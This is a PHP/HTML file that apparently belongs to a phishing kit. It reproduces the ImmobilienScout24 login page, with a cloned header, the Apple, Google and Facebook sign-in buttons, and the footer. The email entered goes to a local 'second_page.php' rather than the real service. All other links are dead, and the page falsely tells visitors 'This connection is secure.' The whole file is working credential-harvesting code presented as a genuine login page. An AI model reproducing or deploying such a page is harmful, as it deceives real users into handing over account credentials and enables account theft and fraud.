<?php
session_start(); // Session starts here.
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - ImmobilienScout24</title>
    <link rel="stylesheet" type="text/css" href="css/core.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap-tooltip.min.css">
    <link rel="stylesheet" type="text/css" href="css/is24-font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="css/s24-icons.css">
    <link rel="stylesheet" type="text/css" href="css/sso.min.css">
    <link rel="stylesheet" type="text/css" href="css/s24-icons.woff2">
    <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/m=el_main.css">
    <link rel="icon" type="image/png" sizes="32x32" href="image/favicon-32x32.png">
</head>
<body class="height-full grid-flex flex-flow-column" data-theme="cosma">
    <header>
        <cms-include fragment="/content/is24/deu/www/de/utils/header-footer/header/white/_jcr_content/menu.syndicate.html">
          <div data-theme="cosma">
            <header class="page-header page-header--white page-header--white--composite page-header--white--2016 content-wrapper-container" role="banner" data-path="white">
              <div class="clearfix content-wrapper vertical-center-container" data-cms-qa="is24-cms-page-header-logo" style="position: relative;">
                <div class="float-left vertical-center-container">
                  <a href="#" class="page-header__logo vertical-center" title="ImmoScout24" aria-label="ImmoScout24">
                    <!-- <img alt="ImmoScout24" class="cosma-hide" onerror="this.src=&#39;image/logo.png&#39;;this.onerror=null;" src="image/logo.svg"> -->
                    <img alt="ImmoScout24" class="core-hide" onerror="this.src=image/immoscout24.png;this.onerror=null;" src="image/immoscout24.svg">
                  </a>
                  <span class="palm-hide page-header__brand vertical-center font-s" data-cms-qa="is24-cms-page-header-brand">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;"> The No. 1 for real estate.</font>
                    </font>
                  </span>
                </div>
                <div class="float-right vertical-center-container"></div>
              </div>
            </header>
          </div>
        </cms-include>
    </header>
    <div class="background palm-background-white flex-grow-1 grid background-image hero-image">
        <div class="background-white border align-center sso-shadow padding-xl box-max-width box-min-height margin-vertical-xl margin-horizontal-auto grid-flex flex-flow-column palm-no-margin-vertical  palm-no-shadow palm-no-border palm-no-min-height">
          <h4 id="emailEntry" class="font-light margin-bottom-xl">
            <span>
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Login or register</font>
              </font>
            </span>
          </h4>
          <form id="loginForm" method="post" action="second_page.php">
            <div></div>
            <input type="hidden" value="c088834f-f99d-4a98-8018-8baa7183975f" readonly="readonly" id="tokenMapt1693594139888" name="tokenMap[t1693594139888]">
            <input id="username2" type="hidden" value="c3NvLmltbW9iaWxpZW5zY291dDI0LmRl" readonly="readonly" name="mds">
            <div class="padding-top input-text-container">
              <label class="float-left input-label" for="username">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">email</font>
                </font>
              </label>
              <input id="email" type="email" class="input-text one-whole margin-top-xs" inputmode="email" autofocus="autofocus" name="email" value="" required>
            </div>
            <div class="grid-item">
              <button id="submit" class="button-primary one-whole margin-top-l" type="submit" value="Submit">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Further</font>
                </font>
              </button>
            </div>
            <div class="grid-item padding-top">
              <p>
                <span>
                  <a href="#" class="with-icon" id="forgotAccessData">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Forgot your login?</font>
                    </font>
                  </a>
                </span>
              </p>
            </div>
            <div class="grid-item one-whole margin-vertical-xl">
              <div class="grid absolute-reference">
                <div class="grid-item">
                  <hr class="divider-color">
                </div>
                <div class="grid-item push-one-third one-third align-center absolute-content" style="bottom: 0em;">
                  <span class="background-white padding-horizontal-xxl divider-text-color">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">or</font>
                    </font>
                  </span>
                </div>
              </div>
            </div>
          </form>
          <fieldset class="grid padding-bottom" style="position: relative;">
            <div id="socialSection">
              <div class="grid-item" id="appleButtonLinkLogin">
                <a href="#" id="appleLoginConnectButtonLinkLogin">
                  <button class="button-primary one-whole border-none margin-bottom-l socialButtonApple">
                    <img src="image/apple-white.png" width="28px" class="align-middle">
                    <span class="padding-left-xs font-white align-middle">
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Sign in with Apple</font>
                      </font>
                    </span>
                  </button>
                </a>
              </div>
              <div class="grid-item" id="googleButtonLinkLogin">
                <a href="#">
                  <div class="button-primary one-whole border margin-bottom-l socialButtonGoogle">
                    <img src="image/google.png" width="22px" class="align-middle">
                    <span class="padding-left-xs font-regular align-middle">
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Sign in with Google</font>
                      </font>
                    </span>
                  </div>
                </a>
              </div>
              <div class="grid-item" id="facebookButtonLinkLogin">
                <a href="#" id="facebookConnectButtonLinkLogin">
                  <button class="button-primary one-whole border-none padding-s socialButtonFacebook">
                    <img src="image/facebook-white.png" width="18px" class="align-middle">
                    <span class="font-white padding-left-xs align-middle">
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">Log in with Facebook</font>
                      </font>
                    </span>
                  </button>
                </a>
              </div>
            </div>
          </fieldset>
          <div class="font-lightgray one-whole grid-item margin-top-auto padding-top-l">
            <div class="grid-item one-whole align-center">
              <img src="image/icn_lock.svg">
              <span class="align-top">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">This connection is secure.</font>
                </font>
              </span>
            </div>
          </div>
        </div>
    </div>
    <!-- footer -->
    <cms-include fragment="/content/is24/deu/www/de/utils/header-footer/footer/light/_jcr_content/footer.html">
        <footer class="page-footer main-footer" role="contentinfo" data-cms-qa="page-footer" data-path="light">
          <section class="content-wrapper padding-top-l">
            <h6>
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">side information</font>
              </font>
            </h6>
            <ul class="margin-bottom-m">
              <li>
                <a href="#" title="Contact &amp; Help" aria-label="Contact &amp; Help" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Contact &amp; Help</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="imprint" aria-label="imprint" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">imprint</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="Terms &amp; Conditions &amp; Legal Notices" aria-label="Terms &amp; Conditions &amp; Legal Notices" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Terms &amp; Conditions &amp; Legal Notices</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="consumer information" aria-label="consumer information" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">consumer information</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="data protection" aria-label="data protection" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">data protection</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="Security" aria-label="Security" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Security</font>
                  </font>
                </a>
              </li>
            </ul>
            <p class="build-information">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">© Copyright 1999 - 2023 Immobilien Scout GmbH</font>
              </font>
            </p>
          </section>
        </footer>
    </cms-include>
</body>
</html>